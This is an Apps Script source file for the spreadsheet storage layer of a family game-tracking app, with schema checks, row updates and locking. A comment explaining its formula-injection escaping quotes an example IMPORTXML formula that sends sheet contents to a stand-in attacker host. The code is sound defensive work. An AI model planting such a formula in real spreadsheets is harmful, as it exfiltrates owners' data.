/**
 * Storage layer backed by a Google Spreadsheet.
 *
 * Everything that touches SpreadsheetApp lives in this file. The local
 * development server (dev/local-server.js) swaps this single file for an
 * equivalent JSON-file implementation, which is what lets the rest of the app
 * run unchanged outside Apps Script.
 */

var SPREADSHEET_ID_KEY = 'SPREADSHEET_ID';

/** Leading characters that make Sheets parse a cell as a formula. */
var FORMULA_LEAD = /^[=+\-@\t\r]/;

/**
 * Escapes strings that Sheets would otherwise evaluate as formulas.
 *
 * setValues() parses a leading '=' exactly like typing into the cell does, so a
 * note reading `=IMPORTXML("https://evil.example?d="&JOIN(",",A:Z),"//a")` would
 * exfiltrate the sheet the moment its owner opened it. Prefixing an apostrophe
 * pins the cell to text; Sheets treats that apostrophe as formatting rather than
 * content and drops it again on read, so values round-trip unchanged.
 *
 * Applied to whole row arrays because storeUpdateRowsByKey writes back rows it
 * only read, which would otherwise turn stored text back into live formulas.
 *
 * @param {unknown[][]} rows
 * @returns {unknown[][]}
 */
function sanitizeRows_(rows) {
  return rows.map(function (row) {
    return row.map(function (value) {
      return typeof value === 'string' && FORMULA_LEAD.test(value) ? "'" + value : value;
    });
  });
}

/**
 * Returns the spreadsheet holding the data, resolved from script properties.
 * @returns {GoogleAppsScript.Spreadsheet.Spreadsheet}
 */
function getSpreadsheet_() {
  var id = PropertiesService.getScriptProperties().getProperty(SPREADSHEET_ID_KEY);
  if (!id) {
    throw new Error('スプレッドシートが未設定です。GASエディタで setup() を1度実行してください。');
  }
  return SpreadsheetApp.openById(id);
}

/**
 * Tables whose header row has already been checked in this execution.
 *
 * The check costs one extra read per table, and an Apps Script execution is
 * short-lived, so the verdict is cached rather than re-read on every call.
 *
 * @type {Record<string, boolean>}
 */
var verifiedHeaders_ = {};

/**
 * Throws when a sheet's header row no longer matches its schema.
 *
 * Rows are addressed by column position, not by header name, so a sheet whose
 * columns have drifted from SCHEMA -- a column inserted or removed by hand, or
 * left over from an older version of the app -- does not fail: it quietly reads
 * every field one slot over. A number lands in a boolean field, a flag lands in
 * `deleted`, and games disappear from the app with nothing logged. Refusing to
 * touch the sheet at all is the only safe response.
 *
 * @param {string} tableName
 * @param {GoogleAppsScript.Spreadsheet.Sheet} sheet
 * @returns {void}
 */
function verifyHeader_(tableName, sheet) {
  if (verifiedHeaders_[tableName]) return;
  var columns = SCHEMA[tableName];
  var header = sheet.getRange(1, 1, 1, columns.length).getValues()[0]
    .map(function (cell) { return String(cell === null || cell === undefined ? '' : cell).trim(); });

  if (header.join('') === '') {
    throw new Error('「' + tableName + '」シートに見出し行がありません。' +
      '1行目に次の見出しを入れてください: ' + columns.join(', '));
  }
  for (var i = 0; i < columns.length; i++) {
    if (header[i] !== columns[i]) {
      throw new Error('「' + tableName + '」シートの列がアプリの想定と違います。' +
        (i + 1) + '列目は「' + columns[i] + '」であるべきですが「' + header[i] + '」でした。' +
        'データが1列ずれて読まれるのを防ぐため処理を中止しました。' +
        '想定する列の並び: ' + columns.join(', '));
    }
  }
  verifiedHeaders_[tableName] = true;
}

/**
 * Returns a sheet by name, creating it with its header row when missing.
 *
 * An existing sheet is checked against its schema before it is handed out; see
 * verifyHeader_ for why that is worth a read.
 *
 * @param {string} tableName
 * @returns {GoogleAppsScript.Spreadsheet.Sheet}
 */
function getSheet_(tableName) {
  var spreadsheet = getSpreadsheet_();
  var sheet = spreadsheet.getSheetByName(tableName);
  if (!sheet) {
    sheet = spreadsheet.insertSheet(tableName);
    var header = SCHEMA[tableName];
    sheet.getRange(1, 1, 1, header.length).setValues([header]).setFontWeight('bold');
    sheet.setFrozenRows(1);
    verifiedHeaders_[tableName] = true;
    return sheet;
  }
  verifyHeader_(tableName, sheet);
  return sheet;
}

/**
 * Reads every data row of a table.
 * @param {string} tableName
 * @returns {Record<string, any>[]}
 */
function storeReadTable(tableName) {
  var sheet = getSheet_(tableName);
  var lastRow = sheet.getLastRow();
  if (lastRow < 2) return [];
  var columns = SCHEMA[tableName];
  var values = sheet.getRange(2, 1, lastRow - 1, columns.length).getValues();
  return values
    .filter(function (row) { return String(row[0]).trim() !== ''; })
    .map(function (row) { return rowToObject(tableName, row); });
}

/**
 * Appends rows to a table.
 * @param {string} tableName
 * @param {Record<string, any>[]} objects
 * @returns {void}
 */
function storeAppendRows(tableName, objects) {
  if (!objects.length) return;
  var sheet = getSheet_(tableName);
  var rows = objects.map(function (obj) { return objectToRow(tableName, obj); });
  sheet.getRange(sheet.getLastRow() + 1, 1, rows.length, SCHEMA[tableName].length)
    .setValues(sanitizeRows_(rows));
}

/**
 * Rewrites in place every row whose key column matches one of the given values.
 *
 * @param {string} tableName
 * @param {string} keyColumn Column used to identify rows, e.g. 'gameId'.
 * @param {Record<string, Record<string, any>>} updatesByKey
 *   Map of key value to the full replacement object.
 * @returns {number} How many rows were rewritten.
 */
function storeUpdateRowsByKey(tableName, keyColumn, updatesByKey) {
  var sheet = getSheet_(tableName);
  var lastRow = sheet.getLastRow();
  if (lastRow < 2) return 0;
  var columns = SCHEMA[tableName];
  var keyIndex = columns.indexOf(keyColumn);
  if (keyIndex < 0) throw new Error('unknown column: ' + tableName + '.' + keyColumn);

  var range = sheet.getRange(2, 1, lastRow - 1, columns.length);
  var values = range.getValues();
  var updated = 0;
  for (var i = 0; i < values.length; i++) {
    var key = String(values[i][keyIndex]);
    if (Object.prototype.hasOwnProperty.call(updatesByKey, key)) {
      values[i] = objectToRow(tableName, updatesByKey[key]);
      updated++;
    }
  }
  if (updated) range.setValues(sanitizeRows_(values));
  return updated;
}

/**
 * Deletes every row whose key column matches one of the given values.
 *
 * Used only to replace a game's result rows when it is edited; user-facing
 * deletion is a `deleted` flag, never a row removal.
 *
 * @param {string} tableName
 * @param {string} keyColumn
 * @param {string[]} keys
 * @returns {number} How many rows were removed.
 */
function storeDeleteRowsByKey(tableName, keyColumn, keys) {
  if (!keys.length) return 0;
  var sheet = getSheet_(tableName);
  var lastRow = sheet.getLastRow();
  if (lastRow < 2) return 0;
  var columns = SCHEMA[tableName];
  var keyIndex = columns.indexOf(keyColumn);
  var values = sheet.getRange(2, 1, lastRow - 1, columns.length).getValues();
  /** @type {Record<string, boolean>} */
  var targets = {};
  keys.forEach(function (key) { targets[String(key)] = true; });

  // Delete from the bottom up so the earlier row indexes stay valid.
  var removed = 0;
  for (var i = values.length - 1; i >= 0; i--) {
    if (targets[String(values[i][keyIndex])]) {
      sheet.deleteRow(i + 2);
      removed++;
    }
  }
  return removed;
}

/**
 * Runs a function while holding the script lock, so that two family members
 * submitting at the same time cannot interleave their writes.
 *
 * @template T
 * @param {() => T} fn
 * @returns {T}
 */
function withLock(fn) {
  var lock = LockService.getScriptLock();
  if (!lock.tryLock(20000)) {
    throw new Error('他の人が登録中です。少し待ってからもう一度お試しください。');
  }
  try {
    return fn();
  } finally {
    lock.releaseLock();
  }
}

/**
 * Returns the current timestamp as an ISO 8601 string.
 * @returns {string}
 */
function nowIso() {
  return new Date().toISOString();
}

/**
 * Returns today's date key in the spreadsheet's timezone.
 * @returns {string} 'YYYY-MM-DD'
 */
function todayKey() {
  return formatDateKey(new Date());
}
